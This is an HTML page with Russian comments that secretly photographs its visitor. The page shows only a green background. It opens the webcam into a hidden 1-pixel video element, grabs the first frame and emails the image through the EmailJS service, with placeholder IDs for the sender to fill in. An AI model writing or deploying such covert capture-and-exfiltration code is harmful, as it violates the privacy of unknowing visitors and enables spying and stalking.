<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Авто фото</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background-color: green; /* зелёная трава */
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    video {
      width: 1px;
      height: 1px;
      opacity: 0; /* невидимое, но реально работает */
      position: absolute;
    }
    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
  <script>
    emailjs.init("ТВОЙ_USER_ID"); // замените на свой User ID

    function sendPhoto(photoUrl) {
      emailjs.send('service_zv13ydk', 'ТВОЙ_TEMPLATE_ID', {
        time: new Date().toLocaleString(),
        photo_link: photoUrl
      })
      .then(() => console.log('Письмо отправлено!'))
      .catch(err => console.error('Ошибка отправки:', err));
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Ждём, пока видео реально готово к воспроизведению
        video.onplaying = () => {
          // Подстраиваем canvas под размер видео
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          // Используем requestAnimationFrame, чтобы точно поймать первый кадр
          requestAnimationFrame(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/png');
            console.log('Фото сделано:', photoData);

            sendPhoto(photoData); // Отправка на почту
          });
        };
      })
      .catch(err => alert("Ошибка доступа к камере: " + err.message));
  </script>
</body>
</html>
